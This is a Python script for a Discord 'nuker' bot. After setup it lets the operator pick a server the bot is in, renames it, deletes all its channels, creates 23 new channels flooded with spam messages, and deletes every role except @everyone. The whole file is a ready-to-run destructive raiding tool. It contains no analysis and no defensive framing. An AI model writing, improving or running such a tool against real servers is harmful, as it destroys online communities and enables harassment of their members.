import os
import json
import asyncio
import discord
from discord.ext import commands
from colorama import init, Fore

init(autoreset=True)

CONFIG_FILE = "config.json"

def save_config(data):
    with open(CONFIG_FILE, "w") as f:
        json.dump(data, f, indent=4)
    print(f"{Fore.GREEN}[i] Created {CONFIG_FILE}")

def load_config():
    if os.path.exists(CONFIG_FILE):
        if os.path.getsize(CONFIG_FILE) == 0:
            print(f"{Fore.RED}[!] config.json is empty. Regenerating...")
            return startup_ui()
        try:
            with open(CONFIG_FILE, "r") as f:
                return json.load(f)
        except json.JSONDecodeError:
            print(f"{Fore.RED}[!] config.json is corrupted. Recreating...")
            return startup_ui()
    else:
        return startup_ui()

def startup_ui():
    print(f"{Fore.CYAN}== Nuker Setup ==")
    token = input("Paste token >> ").strip()
    prefix = input("Paste prefix >> ").strip()
    owner_id = input("Paste bot's owner ID (If several use ',') >> ").strip()
    whitelist = input("Enable whitelisting (y/n) >> ").strip().lower() == "y"

    config = {
        "token": token,
        "prefix": prefix,
        "owner_ids": [int(i.strip()) for i in owner_id.split(",")],
        "whitelist": whitelist
    }
    save_config(config)
    return config

async def nuker_logic(guild: discord.Guild):
    print(f"{Fore.YELLOW}Renaming server...")
    try:
        await guild.edit(name="SERVER NAME CHANGE")
        print(f"{Fore.GREEN}Server name changed.")
    except Exception as e:
        print(f"{Fore.RED}Failed to change server name: {e}")

    print(f"{Fore.YELLOW}Deleting all channels...")
    try:
        await asyncio.gather(*(c.delete() for c in guild.channels), return_exceptions=True)
    except Exception as e:
        print(f"{Fore.RED}Error deleting channels: {e}")

    print(f"{Fore.YELLOW}Creating 'owned' channels...")

    # Create all 23 channels concurrently
    create_tasks = [guild.create_text_channel("CHANNEL NAME") for _ in range(23)]
    channels = await asyncio.gather(*create_tasks, return_exceptions=True)

    # Filter only successfully created channels
    channels = [ch for ch in channels if isinstance(ch, discord.TextChannel)]

    print(f"{Fore.YELLOW}Sending messages in channels...")

    # Prepare all send message tasks concurrently
    send_tasks = []
    for ch in channels:
        for msg in ["CUSTOM TEXT HERE, CUSTOM TEXT HERE", "@CUSTOM TEXT HERE", "CUSTOM TEXT HERE", "CUSTOM TEXT HERE", "CUSTOM TEXT HERE"]:
            send_tasks.append(ch.send(msg))

    # Run all send tasks concurrently
    await asyncio.gather(*send_tasks, return_exceptions=True)

    print(f"{Fore.YELLOW}Deleting roles...")
    try:
        await asyncio.gather(*(r.delete() for r in guild.roles if r.name != "@everyone"), return_exceptions=True)
    except:
        pass

def run_bot():
    config = load_config()
    intents = discord.Intents.all()
    bot = commands.Bot(command_prefix=config["prefix"], intents=intents)

    @bot.event
    async def on_ready():
        print(f"{Fore.GREEN}[✓] Logged in as {bot.user}")
        if not bot.guilds:
            print(f"{Fore.RED}[!] Bot is not in any servers.")
            await bot.close()
            return

        print(f"{Fore.BLUE}Choose a server to nuke:")
        for idx, guild in enumerate(bot.guilds, start=1):
            print(f"{idx}. {guild.name} ({guild.id})")

        try:
            choice = int(input(f"\n{Fore.WHITE}Enter number: ").strip())
            if 1 <= choice <= len(bot.guilds):
                selected_guild = bot.guilds[choice - 1]
                print(f"{Fore.YELLOW}Selected: {selected_guild.name}")
                await nuker_logic(selected_guild)
            else:
                print(f"{Fore.RED}Invalid selection.")
        except ValueError:
            print(f"{Fore.RED}Not a number.")
        finally:
            await bot.close()

    bot.run(config["token"])

if __name__ == "__main__":
    run_bot()
